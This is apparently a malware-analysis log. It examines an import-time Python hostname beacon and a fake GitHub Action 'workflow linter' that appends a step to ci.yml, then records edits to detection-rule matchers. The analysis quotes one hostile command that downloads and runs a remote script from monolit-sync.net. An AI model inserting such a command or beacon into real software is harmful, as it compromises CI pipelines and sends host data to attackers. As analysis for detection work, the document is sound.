samples.identification: Executable Python import-time OOB hostname-beacon regression control
evidence: Read the complete 335-byte source and raw facts, including call arguments and the local value-flow graph. There is no obfuscation or hidden stage.

Module evaluation imports socket and requests, binds HOST to socket.gethostname(), and directly posts json={host: HOST} to a fixed HTTPS Oastify collector. The request does not require calling an exported function or an opt-in flag; its response is discarded.

Executed the exact source with socket and requests replaced by in-memory recording modules. Confirmed the hostname value reaches the JSON body during import; no real hostname or network request was used.

The bytes match the local regression fixture, and its docstring explicitly calls it a test control. That supports its identification as a functional attack control, not a registry-package attribution. The disclosure does not guard the executable host-export behavior. Finding this unguarded import on a machine remains suspicious of malicious use.
missing_context: No registry distribution name/version, user-authorized test deployment, or collector ownership is supplied.
Successful network delivery was not tested.
samples.coverage_limit: The three retained hostile findings describe one supported hostname-beacon mechanism; no distinct credential theft, persistence, payload execution or evasion is supported.

samples.identification: marrowworks composite GitHub Action posing as a workflow linter
evidence: Listed the tar members and read action.yml, README.md and LICENSE completely. The manifest claims Workflow linter, but contains no linting implementation.
A test for $HOME/.cache/307aa0 gates execution. The action assigns .github/workflows/ci.yml to Y, exits if that file is absent, and searches for a duplicate token with grep -q.

If the token is absent, cat appends a quoted literal heredoc to the existing workflow. The appended compliance step requests curl -fsSL https://monolit-sync.net/hook/307aa0 | sh. The append targets the same variable checked for existence.

An isolated HOME and working tree confirmed that absent-cache and absent-workflow paths do not write, the activated path appends, and a second run does not append again. The quoted heredoc writes the command as data; it does not run curl or the downloaded script immediately.

The appended sequence begins at column zero and makes a normal workflow mapping invalid YAML. This limits payload execution and can disrupt CI, but does not refute the attempted trusted-workflow injection. No commit, push, token theft or successful future execution is established.
missing_context: The cache-flag creator and intended activation campaign are unknown.
The remote hook content, any valid alternative target-workflow layout, and subsequent commit/run behavior are unknown.
samples.coverage_limit: One hostile implant finding and one suspicious structural append finding cover the single demonstrated attack mechanism. Additional independent hostile or suspicious mechanisms cannot be manufactured to meet numeric minimums.

changes.reason: A requests POST to a collection-named URL does not establish transfer of a file or attachment. The primary sample sends only a hostname object. Matcher, effective scope, criticality, confidence and mappings are unchanged; both exact consumers were updated.

Audited the 100-rule POST leaf before relocation. This existing matcher finds a source literal describing axios data without requiring POST or an executed call. Preserved its matcher and effective scope/severity, corrected its description and moved all five exact references across four consumers.

Audited the 100-rule body leaf. JSON.stringify with a btoa field establishes encoding but requires no HTTP call or request body. Preserved its matcher and scope/severity and updated both intent consumers. Removed only an explicit for field identical to its new file default.
Added a general shell parse-tree matcher requiring append redirection and heredoc input on the same statement. It does not infer execution of commands held in a literal heredoc.
Descriptions now identify command-text references; their raw-text matchers do not establish immediate execution. Matchers and severity are unchanged.
